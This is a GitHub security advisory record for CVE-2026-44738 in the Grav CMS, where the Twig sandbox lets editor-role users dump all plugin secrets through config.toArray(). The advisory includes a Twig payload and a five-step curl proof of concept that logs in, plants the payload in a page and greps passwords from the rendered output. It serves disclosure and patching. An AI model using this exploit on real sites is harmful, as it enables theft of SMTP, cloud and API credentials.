{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/83944100?v=4", "events_url": "https://api.github.com/users/Revanth011/events{/privacy}", "followers_url": "https://api.github.com/users/Revanth011/followers", "following_url": "https://api.github.com/users/Revanth011/following{/other_user}", "gists_url": "https://api.github.com/users/Revanth011/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/Revanth011", "id": 83944100, "login": "Revanth011", "node_id": "MDQ6VXNlcjgzOTQ0MTAw", "organizations_url": "https://api.github.com/users/Revanth011/orgs", "received_events_url": "https://api.github.com/users/Revanth011/received_events", "repos_url": "https://api.github.com/users/Revanth011/repos", "site_admin": false, "starred_url": "https://api.github.com/users/Revanth011/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Revanth011/subscriptions", "type": "User", "url": "https://api.github.com/users/Revanth011", "user_view_type": "public"}}], "cve_id": "CVE-2026-44738", "cvss": {"score": 7.7, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N"}, "cvss_severities": {"cvss_v3": {"score": 7.7, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-200", "name": "Exposure of Sensitive Information to an Unauthorized Actor"}], "description": "## Summary

The Twig sandbox allow-list permits any user with the `admin.pages` role to call `config.toArray()` from within a page body, dumping the entire merged site configuration — including all plugin secrets (SMTP passwords, AWS keys, OAuth client secrets, API tokens) — into the rendered HTML. No administrator privileges are required.

## Details

The Twig sandbox allow-list in `system/config/security.yaml` explicitly permits `Config::toArray()` for the `Grav\Common\Config\Config` class:

```yaml
- class: 'Grav\Common\Config\Config'
  methods: 'get, toarray, value, default, offsetget, offsetexists'
```

The `config` object — which holds the full merged configuration tree including every key under `plugins.*` — is injected into every sandboxed render in `system/src/Grav/Common/Twig/Twig.php` (line 292):

```php
$twig_vars = [..., 'config' => $config, ...]
```

Any editor with `admin.pages` can save a page with `process.twig: true` in the frontmatter and the following payload in the body:

```
{{ config.toArray()|json_encode|raw }}
```

When the page is rendered, the full config tree is dumped as JSON in the HTML, including all plugin secrets stored under `user/config/plugins/*.yaml`.

## PoC

```bash
# Step 1 — Get login nonce
NONCE=$(curl -sc /tmp/cookies.txt http://TARGET/admin \
  | grep -oP '(?<=name="login-nonce" value=")[^"]+')

# Step 2 — Login as editor (no admin.super)
curl -sc /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST http://TARGET/admin \
  --data-urlencode "data[username]=EDITOR_USER" \
  --data-urlencode "data[password]=EDITOR_PASS" \
  --data-urlencode "task=login" \
  --data-urlencode "login-nonce=${NONCE}" -o /dev/null

# Step 3 — Get admin nonce
ADMIN_NONCE=$(curl -s -b /tmp/cookies.txt http://TARGET/admin/pages \
  | grep -oP '(?<=admin-nonce" value=")[^"]+' | head -1)

# Step 4 — Save page with process.twig:true and payload
curl -s -b /tmp/cookies.txt \
  -X POST http://TARGET/admin/pages/poc \
  --data-urlencode "admin-nonce=${ADMIN_NONCE}" \
  --data-urlencode "task=save" \
  --data-urlencode "data[frontmatter]=title: poc
process:
    twig: true
published: true" \
  --data-urlencode "data[content]={{ config.toArray()|json_encode|raw }}" \
  --data-urlencode "data[folder]=poc" \
  --data-urlencode "data[route]=/" \
  --data-urlencode "data[name]=default" -o /dev/null

# Step 5 — Retrieve secrets from rendered page
curl -s http://TARGET/poc | grep -o '"password":"[^"]*"'
```

## Impact

Any user with the editor role (`admin.pages`) can exfiltrate all plugin credentials stored in the site configuration without any administrator privileges. Affected secrets include SMTP passwords, AWS access/secret keys, OAuth client secrets, reCAPTCHA keys, and any API token stored in plugin YAML config. Each extracted credential independently compromises the connected service.", "epss": {"percentage": 0.00276, "percentile": 0.19492}, "ghsa_id": "GHSA-j274-39qw-32c9", "github_reviewed_at": "2026-05-13T15:29:40Z", "html_url": "https://github.com/advisories/GHSA-j274-39qw-32c9", "identifiers": [{"type": "GHSA", "value": "GHSA-j274-39qw-32c9"}, {"type": "CVE", "value": "CVE-2026-44738"}], "nvd_published_at": "2026-05-11T17:16:34Z", "published_at": "2026-05-13T15:29:40Z", "references": ["https://github.com/getgrav/grav/security/advisories/GHSA-j274-39qw-32c9", "https://nvd.nist.gov/vuln/detail/CVE-2026-44738", "https://github.com/getgrav/grav/releases/tag/2.0.0-rc.2", "https://github.com/advisories/GHSA-j274-39qw-32c9"], "repository_advisory_url": "https://api.github.com/repos/getgrav/grav/security-advisories/GHSA-j274-39qw-32c9", "severity": "high", "source_code_location": "https://github.com/getgrav/grav", "summary": "Grav: Twig sandbox allows editor-role users to exfiltrate all plugin secrets via Config::toArray()", "type": "reviewed", "updated_at": "2026-05-13T15:29:43Z", "url": "https://api.github.com/advisories/GHSA-j274-39qw-32c9", "vulnerabilities": [{"first_patched_version": "2.0.0-rc.2", "package": {"ecosystem": "composer", "name": "getgrav/grav"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 2.0.0-rc.1"}], "withdrawn_at": null}

title: Grav: Twig sandbox allows editor-role users to exfiltrate all plugin secrets via Config::toArray()
